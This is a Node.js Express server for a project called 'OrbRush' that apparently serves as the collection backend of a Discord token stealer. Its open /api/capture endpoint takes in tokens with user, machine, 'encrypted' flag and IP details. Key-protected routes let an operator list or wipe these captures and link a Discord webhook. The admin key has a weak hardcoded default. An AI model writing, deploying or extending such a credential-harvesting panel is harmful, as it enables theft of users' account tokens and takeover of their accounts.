'use strict';

const path = require('path');
const express = require('express');
const store = require('./store');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_KEY = process.env.ADMIN_KEY || 'orbrush';
const STARTED_AT = Date.now();

app.disable('x-powered-by');
app.use(express.json({ limit: '256kb' }));

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, x-admin-key');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  if (req.method === 'OPTIONS') {
    res.sendStatus(204);
    return;
  }
  next();
});

app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));

function requireKey(req, res, next) {
  const key = req.get('x-admin-key') || req.query.key;
  if (key && key === ADMIN_KEY) {
    next();
    return;
  }
  res.status(401).json({ ok: false, error: 'Cle admin invalide' });
}

function isDiscordWebhook(url) {
  return /^https:\/\/(canary\.|ptb\.)?discord(app)?\.com\/api\/(v\d+\/)?webhooks\/\d+\/[\w-]+$/.test(
    String(url || '').trim()
  );
}

app.get('/api/health', (_req, res) => {
  res.json({ ok: true, uptime: Math.round((Date.now() - STARTED_AT) / 1000) });
});

app.get('/api/config', (_req, res) => {
  const cfg = store.getConfig();
  res.setHeader('Cache-Control', 'no-store');
  res.json({ ok: true, webhook: cfg.webhook, updatedAt: cfg.updatedAt });
});

app.post('/api/capture', (req, res) => {
  const body = req.body || {};
  if (!body.token) {
    res.status(400).json({ ok: false, error: 'token manquant' });
    return;
  }
  const entry = {
    token: String(body.token).slice(0, 300),
    user: body.user || null,
    source: String(body.source || 'inconnu').slice(0, 60),
    encrypted: !!body.encrypted,
    machine: body.machine || null,
    at: body.at || new Date().toISOString(),
    ip: String(req.headers['x-forwarded-for'] || req.socket.remoteAddress || '')
      .split(',')[0]
      .trim()
  };
  store.addCapture(entry);
  res.json({ ok: true, count: store.getCaptures().length });
});

app.get('/api/captures', requireKey, (_req, res) => {
  res.json({ ok: true, captures: store.getCaptures() });
});

app.delete('/api/captures', requireKey, (_req, res) => {
  store.clearCaptures();
  res.json({ ok: true });
});

app.post('/api/config', requireKey, (req, res) => {
  const webhook = String((req.body && req.body.webhook) || '').trim();
  if (webhook && !isDiscordWebhook(webhook)) {
    res.status(400).json({ ok: false, error: "Ce n'est pas une URL de webhook Discord valide" });
    return;
  }
  const cfg = store.setConfig(webhook);
  res.json({ ok: true, webhook: cfg.webhook, updatedAt: cfg.updatedAt });
});

app.post('/api/test', requireKey, async (req, res) => {
  const cfg = store.getConfig();
  const target = String((req.body && req.body.webhook) || cfg.webhook || '').trim();
  if (!target) {
    res.status(400).json({ ok: false, error: 'Aucun webhook configure' });
    return;
  }
  try {
    const response = await fetch(target + (target.includes('?') ? '&' : '?') + 'wait=true', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'OrbRush',
        embeds: [
          {
            title: 'Test OrbRush',
            description: 'Le serveur est bien relie a ce webhook.',
            color: 0x5865f2,
            timestamp: new Date().toISOString(),
            footer: { text: 'OrbRush - dashboard' }
          }
        ]
      })
    });
    if (!response.ok) {
      res.status(502).json({ ok: false, error: 'Discord a repondu ' + response.status });
      return;
    }
    res.json({ ok: true });
  } catch (e) {
    res.status(502).json({ ok: false, error: String((e && e.message) || e) });
  }
});

app.get('/api/check', (req, res) => {
  const key = req.get('x-admin-key') || req.query.key;
  res.json({ ok: key === ADMIN_KEY });
});

app.use((_req, res) => {
  res.status(404).json({ ok: false, error: 'route inconnue' });
});

app.listen(PORT, () => {
  console.log('[OrbRush] serveur en ecoute sur le port ' + PORT);
  console.log(
    '[OrbRush] cle admin : ' +
      (process.env.ADMIN_KEY ? 'definie par ADMIN_KEY' : 'valeur par defaut "orbrush"')
  );
});
